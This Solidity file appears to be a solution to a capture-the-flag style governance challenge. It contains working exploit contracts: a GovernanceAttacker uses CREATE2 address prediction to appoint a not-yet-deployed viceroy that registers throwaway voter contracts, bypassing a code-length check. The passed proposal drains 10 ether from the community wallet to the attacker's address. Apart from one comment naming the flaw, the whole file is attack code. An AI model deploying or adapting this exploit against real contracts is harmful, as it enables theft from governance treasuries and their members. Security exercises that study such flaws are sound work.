// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Viceroy.sol";

// Contract addresses can be known before deploying. Thus registering addresses
// together with contract.code.length = 0 check is a bad practice.

contract MyVoter {
    constructor(Governance gov, uint proposalId) {
        gov.voteOnProposal(proposalId, true, address(msg.sender));
    }
}

contract MyViceroy {
    constructor(Governance gov) {
        GovernanceAttacker attacker = GovernanceAttacker(msg.sender);
        uint proposalId = attacker.proposalId(gov);

        gov.createProposal(address(0), attacker.proposalPayload(gov));

        for (uint i = 0; i < 10; ++i) {
            bytes32 salt = bytes32(i);
            address voterAddress = predictAddress(gov, proposalId, salt);

            gov.approveVoter(voterAddress);
            new MyVoter{salt: salt}(gov, proposalId);
            gov.disapproveVoter(voterAddress);
        }

        gov.executeProposal(proposalId);
    }

    function predictAddress(Governance gov, uint proposalId, bytes32 salt) internal view returns (address)  {
        return address(uint160(uint(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(abi.encodePacked(
                    type(MyVoter).creationCode,
                    abi.encode(gov, proposalId)
                ))
            )))));
    }
}

contract GovernanceAttacker {

    address attackerWaller;

    constructor() {
        attackerWaller = msg.sender;
    }

    function attack(Governance gov) external {
        bytes32 salt = "0x4d7956696365726f7953616c74";
        gov.appointViceroy( predictAddress(gov, salt), 1);

        new MyViceroy{salt: salt}(gov);
    }

    function predictAddress(Governance gov, bytes32 salt) internal view returns (address)  {
        return address(uint160(uint(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(abi.encodePacked(
                    type(MyViceroy).creationCode,
                    abi.encode(gov)
                ))
            )))));
    }

    function proposalPayload(Governance gov) public view returns (bytes memory) {
        bytes memory payload = abi.encodeWithSelector(gov.communityWallet().exec.selector,
            address(attackerWaller), "", 10000000000000000000);

        return payload;
    }

    function proposalId(Governance gov) public view returns (uint) {
        return uint256(keccak256(proposalPayload(gov)));
    }

    //    function getBytecode() public view returns (bytes memory)
    //    {
    //        bytes memory bytecode = type(MyViceroy).creationCode;
    //        return abi.encodePacked(bytecode, abi.encode(msg.sender)); //msg.sender is a parameter to constructor
    //    }
    //
    //    function getAddress(uint256 _salt) public view returns (address)
    //    {
    //        // Get a hash concatenating args passed to encodePacked
    //        bytes32 hash = keccak256(
    //            abi.encodePacked(
    //                bytes1(0xff), // 0
    //                address(this), // address of factory contract
    //                _salt, // a random salt
    //                keccak256(getBytecode()) // the wallet contract bytecode
    //            )
    //        );
    //        // Cast last 20 bytes of hash to address
    //        return address(uint160(uint256(hash)));
    //    }
}
